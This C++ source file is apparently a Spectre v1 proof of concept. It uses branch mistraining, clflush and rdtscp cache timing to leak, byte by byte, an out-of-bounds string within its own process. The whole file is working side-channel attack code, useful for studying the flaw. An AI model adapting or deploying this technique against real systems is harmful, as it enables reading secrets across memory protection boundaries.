#include <string_view>
#include <numeric>
#include <tuple>

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <x86intrin.h>

uint64_t rdtscp(uint32_t *aux) {
    uint32_t lo, hi;
    asm volatile ("rdtscp": "=d"(hi), "=a"(lo), "=c"(*aux));
    uint64_t tsc = ((uint64_t)hi << 32) | lo;
    return tsc;
}

uint64_t read_tsc() {
    uint32_t processor_id;
    return rdtscp(&processor_id);
}

void clflush(void const *p) {
    // _mm_clflush(p);
    asm volatile ("clflush (%0)"::"r"(p): "memory");
}

void force_read(uint8_t *p) {
    // *(volatile uint8_t *)p;
    asm volatile ("" ::"r"(*p): "memory");
}

std::pair<int, int> top_two_indices(const int *scores, int n) {
    int best = 0, runner_up = 0;
    for (int i = 0; i < n; i++) {
        if (scores[i] > scores[best]) {
            runner_up = best;
            best = i;
        } else if (scores[i] > scores[runner_up]) {
            runner_up = i;
        }
    }
    return {best, runner_up};
}

char leak_byte(std::string_view text, size_t unsafe_index) {
    constexpr int stride = 256; // 128
    static uint8_t timing_array[256 * stride];
    memset(timing_array, 0, sizeof timing_array);

    const char *data = text.begin();
    // so that it has slow memory access
    size_t *size_in_heap = new size_t(text.size());

    uint64_t latencies[256]{};
    int scores[256]{};
    int best = 0, runner_up = 0;

    for (int run = 0; run < 1000; run++) {
        for (int i = 0; i < 256; i++)
            clflush(&timing_array[i * stride]);

        int safe_index = run % text.size();

        for (int i = 0; i < 100; i++) {
            clflush(size_in_heap);
            for (volatile int z = 0; z < 100; z++); // short delay

            // safe to execute every first 9 times, so maybe 10th is okay too :)
            size_t test_index = ((i + 1) % 10) ? safe_index : unsafe_index;
            if (test_index < *size_in_heap) {
                // The processor may specutively load data[unsafe_index] and
                // the corresponding timing_array entry, though we should never
                // reach here if it's an unsafe index!
                //asm volatile ("lfence" ::: "memory");
                //asm volatile ("pause"); // delay executing next instruction
                force_read(&timing_array[data[test_index] * stride]);
            }
        }

        for (int i = 0; i < 256; i++) {
            int mixed_i = ((i * 167) + 13) & 0xFF;
            uint8_t *timing_entry = &timing_array[mixed_i * stride];
            uint64_t start = read_tsc();
            force_read(timing_entry);
            latencies[mixed_i] = read_tsc() - start;
        }
        uint64_t avg_latency =
            std::accumulate(latencies, latencies + 255, 0) / 256;

        for (int i = 0; i < 256; i++)
            if ((latencies[i] < avg_latency * 3 / 4) && i != data[safe_index])
                scores[i]++;

        std::tie(best, runner_up) = top_two_indices(scores, 256);

        if (scores[best] > (2 * scores[runner_up] + 400))
            break;
    }

    printf("best: '%c', score=%d, runner_up='%c', score=%d\n",
            best, scores[best], runner_up, scores[runner_up]);
    return best;
}

char side_channel[] = "Hello World";        // .data
const char *other_data = "012345678901234567890123456789"
                         "012345678901234567890123456789"
                         "0123456789";      // .rodata
const char *secret_data = "It's a s3kr3t!"; // .rodata

void put_secret_in_cache(const char *secret, int len) {
    //printf("secret: %s\n", secret);
    for (int i = 0; i < len; i++)
        force_read((uint8_t *)secret);
}

int main() {
    int leak_len = 14; // strlen(secret_data);

    //char secret_stack[leak_len];
    //memcpy(secret_stack, secret_data, leak_len);
    //char *secret_heap = new char[leak_len];
    //memcpy(secret_heap, secret_data, leak_len);

    // choose which secret: stack/heap/.rodata
    const char *secret = secret_data;
    //put_secret_in_cache(secret, leak_len);

    printf("distance=%ld\n", secret - side_channel);

    // leak the secret through a side-channel timing attack which utilizes
    // speculative execution of the processor to access out-of-bounds data
    for (size_t i = secret - side_channel; leak_len-- > 0; i++)
        leak_byte(side_channel, i);

    return 0;
}
